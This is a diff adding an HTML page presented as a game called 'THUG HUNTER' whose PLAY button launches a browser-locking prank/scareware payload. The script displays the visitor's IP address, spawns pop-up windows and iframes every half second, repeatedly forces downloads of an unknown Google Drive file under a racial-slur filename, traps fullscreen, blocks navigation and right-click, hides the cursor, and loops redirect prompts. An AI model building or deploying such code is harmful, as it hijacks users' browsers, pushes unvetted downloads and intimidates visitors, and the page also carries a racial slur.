@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>THUG HUNTER: THE GAME</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background-image: url('https://i.imgur.com/0SeeTfG.png');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        /* Shader canvas overlay */
+        #shaderCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            mix-blend-mode: screen;
+        }
+
+        /* Particle system canvas */
+        #particleCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        #headerText {
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 50px;
+            z-index: 999;
+            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000;
+            animation: glitchText 2s infinite, pulse 1.5s infinite;
+        }
+
+        @keyframes glitchText {
+            0%, 100% { transform: translateX(0); }
+            10% { transform: translateX(-2px) translateY(2px); }
+            20% { transform: translateX(2px) translateY(-2px); }
+            30% { transform: translateX(-2px) translateY(2px); }
+            40% { transform: translateX(2px) translateY(-2px); }
+            50% { transform: translateX(-2px) translateY(2px); }
+            60% { transform: translateX(2px) translateY(-2px); }
+            70% { transform: translateX(-2px) translateY(2px); }
+            80% { transform: translateX(2px) translateY(-2px); }
+            90% { transform: translateX(-2px) translateY(2px); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        #playButton {
+            width: 300px;
+            height: 100px;
+            cursor: pointer;
+            border: none;
+            outline: none;
+            background: linear-gradient(45deg, #ff0000, #ff6600, #ff0000);
+            background-size: 200% 200%;
+            z-index: 999;
+            border-radius: 15px;
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+            text-shadow: 0 0 10px #000;
+            box-shadow: 
+                0 0 30px #ff0000,
+                inset 0 0 20px rgba(255, 255, 255, 0.1),
+                0 8px 20px rgba(0, 0, 0, 0.5);
+            transition: all 0.3s ease;
+            animation: buttonFloat 3s ease-in-out infinite, gradientShift 2s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        #playButton::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transform: rotate(45deg);
+            animation: shine 3s ease-in-out infinite;
+        }
+
+        #playButton::after {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            right: 2px;
+            bottom: 2px;
+            background: linear-gradient(45deg, #cc0000, #ff4400, #cc0000);
+            border-radius: 13px;
+            z-index: -1;
+            animation: innerGlow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes buttonFloat {
+            0%, 100% { transform: translateY(0px) scale(1); }
+            50% { transform: translateY(-15px) scale(1.05); }
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            50% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+            100% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+        }
+
+        @keyframes innerGlow {
+            0% { box-shadow: inset 0 0 20px rgba(255, 100, 0, 0.5); }
+            100% { box-shadow: inset 0 0 40px rgba(255, 100, 0, 0.8); }
+        }
+
+        #playButton:hover {
+            transform: scale(1.1) translateY(-5px);
+            box-shadow: 
+                0 0 50px #ff0000,
+                inset 0 0 30px rgba(255, 255, 255, 0.2),
+                0 15px 30px rgba(0, 0, 0, 0.7);
+            background: linear-gradient(45deg, #ff3300, #ff9900, #ff3300);
+        }
+
+        #playButton:active {
+            transform: scale(0.95) translateY(2px);
+            box-shadow: 
+                0 0 40px #ff0000,
+                inset 0 0 25px rgba(255, 255, 255, 0.3),
+                0 5px 15px rgba(0, 0, 0, 0.8);
+        }
+
+        #collage {
+            display: none;
+            position: relative;
+            z-index: 10;
+        }
+
+        .image {
+            position: absolute;
+            width: 150px;
+            height: 150px;
+            object-fit: cover;
+            opacity: 0;
+            transition: opacity 1s;
+            filter: hue-rotate(0deg) saturate(1.5);
+            animation: imageFloat 4s ease-in-out infinite;
+        }
+
+        @keyframes imageFloat {
+            0%, 100% { transform: rotate(0deg) scale(1); }
+            25% { transform: rotate(5deg) scale(1.1); }
+            50% { transform: rotate(-5deg) scale(0.9); }
+            75% { transform: rotate(3deg) scale(1.05); }
+        }
+
+        .floating-frame {
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            border: 3px solid #ff0000;
+            background: white;
+            z-index: 1000;
+            display: none;
+            border-radius: 10px;
+            box-shadow: 0 0 30px #ff0000, inset 0 0 20px rgba(255, 0, 0, 0.3);
+            animation: frameGlow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes frameGlow {
+            0% { box-shadow: 0 0 30px #ff0000, inset 0 0 20px rgba(255, 0, 0, 0.3); }
+            100% { box-shadow: 0 0 50px #ff0000, inset 0 0 30px rgba(255, 0, 0, 0.5); }
+        }
+
+        #ipAddress {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 30px;
+            color: #ff0000;
+            font-weight: bold;
+            z-index: 1002;
+            text-shadow: 0 0 10px #ff0000;
+            animation: ipGlow 1s infinite alternate;
+        }
+
+        @keyframes ipGlow {
+            0% { text-shadow: 0 0 10px #ff0000; }
+            100% { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000; }
+        }
+
+        /* Dynamic background overlay */
+        .dynamic-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(255, 0, 0, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(0, 255, 255, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 40% 80%, rgba(255, 0, 255, 0.3) 0%, transparent 50%);
+            animation: overlayShift 10s ease-in-out infinite;
+            pointer-events: none;
+            z-index: 3;
+            transition: opacity 2s ease-in-out;
+        }
+
+        .overlay-reduced {
+            opacity: 0.1 !important;
+        }
+
+        @keyframes overlayShift {
+            0%, 100% { opacity: 0.3; transform: rotate(0deg) scale(1); }
+            33% { opacity: 0.6; transform: rotate(120deg) scale(1.1); }
+            66% { opacity: 0.4; transform: rotate(240deg) scale(0.9); }
+        }
+
+        /* Screen distortion effect */
+        .screen-distortion {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                repeating-linear-gradient(
+                    0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(255, 255, 255, 0.03) 2px,
+                    rgba(255, 255, 255, 0.03) 4px
+                );
+            pointer-events: none;
+            z-index: 4;
+            animation: scanlines 0.1s linear infinite;
+        }
+
+        @keyframes scanlines {
+            0% { transform: translateY(0px); }
+            100% { transform: translateY(4px); }
+        }
+
+        /* Audio player styling */
+        #audioContainer {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            z-index: 1003;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 10px;
+            border-radius: 10px;
+            border: 2px solid #ff0000;
+            box-shadow: 0 0 20px #ff0000;
+            display: none;
+        }
+
+        #audioStatus {
+            color: #ff0000;
+            font-weight: bold;
+            text-shadow: 0 0 10px #ff0000;
+            animation: ipGlow 1s infinite alternate;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="shaderCanvas"></canvas>
+    <canvas id="particleCanvas"></canvas>
+    <div class="dynamic-overlay"></div>
+    <div class="screen-distortion"></div>
+    
+    <div id="headerText">USE W A S D TO MOVE AROUND</div>
+    <button id="playButton">
+        <span style="position: relative; z-index: 2;">PLAY</span>
+    </button>
+    <div id="collage"></div>
+    
+    <!-- SoundCloud embed widget (hidden) -->
+    <iframe id="soundcloudPlayer" 
+            width="100%" 
+            height="166" 
+            scrolling="no" 
+            frameborder="no" 
+            allow="autoplay" 
+            src="https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/youssef-you-815123367/quash&color=%23ff5500&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true"
+            style="position: absolute; top: -9999px; left: -9999px; width: 300px; height: 166px; visibility: hidden;">
+    </iframe>
+    
+    <div id="audioContainer">
+        <div id="audioStatus">♪ AUDIO LOADING... ♪</div>
+    </div>
+    
+    <div id="ipAddress"></div>
+
+    <script src="https://w.soundcloud.com/player/api.js"></script>
+    <script>
+        // Shader and visual effects setup
+        const shaderCanvas = document.getElementById('shaderCanvas');
+        const shaderCtx = shaderCanvas.getContext('2d');
+        const particleCanvas = document.getElementById('particleCanvas');
+        const particleCtx = particleCanvas.getContext('2d');
+        
+        let particles = [];
+        let time = 0;
+        let gameStarted = false;
+        let soundcloudWidget = null;
+
+        // Resize canvases
+        function resizeCanvases() {
+            shaderCanvas.width = window.innerWidth;
+            shaderCanvas.height = window.innerHeight;
+            particleCanvas.width = window.innerWidth;
+            particleCanvas.height = window.innerHeight;
+        }
+        resizeCanvases();
+        window.addEventListener('resize', resizeCanvases);
+
+        // Initialize SoundCloud widget
+        function initializeSoundCloud() {
+            const iframe = document.getElementById('soundcloudPlayer');
+            soundcloudWidget = SC.Widget(iframe);
+            
+            soundcloudWidget.bind(SC.Widget.Events.READY, function() {
+                console.log('SoundCloud widget ready');
+                document.getElementById('audioStatus').textContent = '♪ AUDIO READY ♪';
+            });
+
+            soundcloudWidget.bind(SC.Widget.Events.PLAY, function() {
+                document.getElementById('audioStatus').textContent = '♪ NOW PLAYING: QUASH ♪';
+            });
+
+            soundcloudWidget.bind(SC.Widget.Events.PAUSE, function() {
+                document.getElementById('audioStatus').textContent = '♪ AUDIO PAUSED ♪';
+            });
+
+            soundcloudWidget.bind(SC.Widget.Events.FINISH, function() {
+                document.getElementById('audioStatus').textContent = '♪ TRACK FINISHED ♪';
+            });
+        }
+
+        // Initialize when page loads
+        window.addEventListener('load', function() {
+            setTimeout(initializeSoundCloud, 1000);
+        });
+
+        // Particle class
+        class Particle {
+            constructor() {
+                this.x = Math.random() * window.innerWidth;
+                this.y = Math.random() * window.innerHeight;
+                this.vx = (Math.random() - 0.5) * 2;
+                this.vy = (Math.random() - 0.5) * 2;
+                this.life = Math.random() * 100 + 50;
+                this.maxLife = this.life;
+                this.color = `hsl(${Math.random() * 60 + 300}, 100%, 50%)`;
+                this.size = Math.random() * 3 + 1;
+            }
+
+            update() {
+                this.x += this.vx;
+                this.y += this.vy;
+                this.life--;
+
+                if (this.x < 0 || this.x > window.innerWidth) this.vx *= -1;
+                if (this.y < 0 || this.y > window.innerHeight) this.vy *= -1;
+
+                return this.life > 0;
+            }
+
+            draw(ctx) {
+                const alpha = this.life / this.maxLife;
+                ctx.save();
+                ctx.globalAlpha = alpha;
+                ctx.fillStyle = this.color;
+                ctx.shadowBlur = 10;
+                ctx.shadowColor = this.color;
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.restore();
+            }
+        }
+
+        // Shader effect simulation (reduced intensity after game starts)
+        function renderShaderEffect() {
+            const intensity = gameStarted ? 0.3 : 1.0;
+            const imageData = shaderCtx.createImageData(shaderCanvas.width, shaderCanvas.height);
+            const data = imageData.data;
+            
+            for (let i = 0; i < data.length; i += 4) {
+                const pixelIndex = i / 4;
+                const x = pixelIndex % shaderCanvas.width;
+                const y = Math.floor(pixelIndex / shaderCanvas.width);
+                
+                const wave1 = Math.sin((x * 0.01) + (time * 0.02)) * 0.5 + 0.5;
+                const wave2 = Math.sin((y * 0.01) + (time * 0.03)) * 0.5 + 0.5;
+                const wave3 = Math.sin(((x + y) * 0.005) + (time * 0.01)) * 0.5 + 0.5;
+                
+                const r = Math.floor(wave1 * 50 * intensity);
+                const g = Math.floor(wave2 * 30 * intensity);
+                const b = Math.floor(wave3 * 70 * intensity);
+                
+                data[i] = r;
+                data[i + 1] = g;
+                data[i + 2] = b;
+                data[i + 3] = Math.floor(30 * intensity);
+            }
+            
+            shaderCtx.putImageData(imageData, 0, 0);
+        }
+
+        // Animation loop
+        function animate() {
+            time += 0.016;
+            
+            shaderCtx.clearRect(0, 0, shaderCanvas.width, shaderCanvas.height);
+            particleCtx.clearRect(0, 0, particleCanvas.width, particleCanvas.height);
+            
+            renderShaderEffect();
+            
+            if (gameStarted) {
+                for (let i = 0; i < 3; i++) {
+                    particles.push(new Particle());
+                }
+                
+                particles = particles.filter(particle => {
+                    const alive = particle.update();
+                    if (alive) particle.draw(particleCtx);
+                    return alive;
+                });
+            }
+            
+            requestAnimationFrame(animate);
+        }
+        animate();
+
+        // Game variables
+        const playButton = document.getElementById('playButton');
+        const collage = document.getElementById('collage');
+        const ipAddressDiv = document.getElementById('ipAddress');
+        const audioContainer = document.getElementById('audioContainer');
+        const soundcloudPlayerDiv = document.getElementById('soundcloudPlayer');
+        
+        const images = [
+            "https://files.catbox.moe/dlxmro.gif",
+            "https://files.catbox.moe/xitn5v.gif"
+        ];
+
+        const windows = [
+            "https://asdfsaf1234-823vdfg.pages.dev/",
+            "https://files.catbox.moe/r33uqr.gif",
+            "https://files.catbox.moe/uozcov.gif",
+            "https://files.catbox.moe/3uoocl.gif"
+        ];
+
+        const newBackgroundImage = 'https://files.catbox.moe/zys6h8.gif';
+
+        function fetchUserIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddressDiv.textContent = `IP: ${data.ip}`;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                });
+        }
+
+        playButton.addEventListener('click', () => {
+            gameStarted = true;
+            document.body.style.backgroundImage = `url('${newBackgroundImage}')`;
+            
+            // Enhanced visual transition
+            document.body.style.transition = 'all 2s ease-in-out';
+            document.body.style.filter = 'hue-rotate(45deg) saturate(1.5) brightness(1.2)';
+
+            // Reduce shader overlays
+            const overlay = document.querySelector('.dynamic-overlay');
+            overlay.classList.add('overlay-reduced');
+
+            // Start SoundCloud audio (player remains hidden)
+            if (soundcloudWidget) {
+                soundcloudWidget.play();
+                audioContainer.style.display = 'block';
+                // Keep player hidden - only show status
+            } else {
+                // Fallback: try to initialize and play
+                setTimeout(() => {
+                    if (soundcloudWidget) {
+                        soundcloudWidget.play();
+                        audioContainer.style.display = 'block';
+                        // Keep player hidden - only show status
+                    }
+                }, 500);
+            }
+
+            playButton.style.display = 'none';
+            collage.style.display = 'block';
+            fetchUserIP();
+            startOpeningWindows();
+            startFileDownload();
+            createCollage();
+            enterFullscreen();
+            lockPage();
+            hideCursor();
+            openFullscreenLockedWindow();
+            askForRedirection();
+        });
+
+        function hideCursor() {
+            document.body.style.cursor = 'none';
+            const floatingFrames = document.querySelectorAll('.floating-frame');
+            floatingFrames.forEach(frame => {
+                frame.style.cursor = 'none';
+            });
+        }
+
+        function enterFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) {
+                document.documentElement.msRequestFullscreen();
+            }
+
+            setInterval(() => {
+                if (!document.fullscreenElement &&
+                    !document.mozFullScreenElement &&
+                    !document.webkitFullscreenElement &&
+                    !document.msFullscreenElement) {
+                    enterFullscreen();
+                }
+            }, 1000);
+        }
+
+        function startOpeningWindows() {
+            setInterval(() => {
+                windows.forEach(url => {
+                    createFloatingFrame(url);
+                    createPopUpWindow(url);
+                });
+            }, 500);
+        }
+
+        function createFloatingFrame(url) {
+            let frame = document.createElement('iframe');
+            frame.src = url;
+            frame.classList.add('floating-frame');
+            frame.onload = () => {
+                frame.style.display = 'block';
+            };
+            frame.onerror = () => {
+                frame.remove();
+                createFloatingFrame(url);
+            };
+
+            document.body.appendChild(frame);
+            animateFrame(frame);
+        }
+
+        function createPopUpWindow(url) {
+            let popup = window.open(url, '_blank', 'width=400,height=400,left=' + Math.random() * (window.innerWidth - 400) + ',top=' + Math.random() * (window.innerHeight - 400));
+            animatePopUpWindow(popup);
+        }
+
+        function animateFrame(frame) {
+            let x = Math.random() * (window.innerWidth - 400);
+            let y = Math.random() * (window.innerHeight - 400);
+            let dx = (Math.random() - 0.5) * 10;
+            let dy = (Math.random() - 0.5) * 10;
+
+            function move() {
+                x += dx;
+                y += dy;
+                if (x < 0 || x > window.innerWidth - 400) dx *= -1;
+                if (y < 0 || y > window.innerHeight - 400) dy *= -1;
+                frame.style.left = `${x}px`;
+                frame.style.top = `${y}px`;
+                requestAnimationFrame(move);
+            }
+            move();
+        }
+
+        function animatePopUpWindow(popup) {
+            let movePopup = () => {
+                let x = Math.random() * (window.innerWidth - 400);
+                let y = Math.random() * (window.innerHeight - 400);
+                popup.moveTo(x, y);
+            };
+
+            setInterval(movePopup, 500);
+        }
+
+        function startFileDownload() {
+            setInterval(() => {
+                let link = document.createElement('a');
+                link.href = "https://drive.google.com/uc?export=download&id=12uYAzh_IlD3GX-9ZWC5g92EqpRFBlAKs";
+                link.download = 'niggersex';
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, 1000);
+        }
+
+        function createCollage() {
+            images.forEach((src, index) => {
+                let img = document.createElement('img');
+                img.src = src;
+                img.classList.add('image');
+                img.style.top = `${Math.random() * 80}vh`;
+                img.style.left = `${Math.random() * 80}vw`;
+                img.style.animationDelay = `${index * 0.5}s`;
+                collage.appendChild(img);
+                setTimeout(() => {
+                    img.style.opacity = 1;
+                    img.style.filter = `hue-rotate(${Math.random() * 360}deg) saturate(1.5)`;
+                }, index * 500);
+            });
+        }
+
+        function lockPage() {
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function () {
+                window.history.pushState(null, null, window.location.href);
+            };
+
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+            });
+
+            window.addEventListener('beforeunload', (e) => {
+                e.preventDefault();
+                e.returnValue = 'Are you sure you want to leave?';
+            });
+        }
+
+        function openFullscreenLockedWindow() {
+            let windowFeatures = "width=" + screen.width + ",height=" + screen.height + ",top=0,left=0,fullscreen=yes,menubar=no,toolbar=no,resizable=no,scrollbars=no,status=no";
+            const fullscreenWindow = window.open('', '_blank', windowFeatures);
+            fullscreenWindow.document.write("<h1 style='color: white; text-align: center; margin-top: 20%; text-shadow: 0 0 20px #ff0000; animation: pulse 1s infinite;'>This window is locked and cannot be moved or resized!</h1>");
+
+            fullscreenWindow.document.body.style.margin = "0";
+            fullscreenWindow.document.body.style.overflow = "hidden";
+            fullscreenWindow.document.body.style.background = "linear-gradient(45deg, #000, #333)";
+            fullscreenWindow.moveTo(0, 0);
+            fullscreenWindow.resizeTo(screen.width, screen.height);
+            fullscreenWindow.document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+            });
+        }
+
+        function askForRedirection() {
+            setInterval(() => {
+                const redirectTo = 'https://drive.google.com/uc?export=download&id=12uYAzh_IlD3GX-9ZWC5g92EqpRFBlAKs';
+                if (confirm(`Do you want to go to this site? ${redirectTo}`)) {
+                    window.location.href = redirectTo;
+                }
+            }, 1000);
+        }
+
+        setInterval(() => {
+            window.dispatchEvent(new Event('beforeunload'));
+        }, 1000);
+
+        // Dynamic color cycling for enhanced visuals
+        setInterval(() => {
+            if (gameStarted) {
+                const hue = (time * 50) % 360;
+                document.documentElement.style.filter = `hue-rotate(${hue}deg)`;
+            }
+        }, 100);
+    </script>
+</body>
+</html>
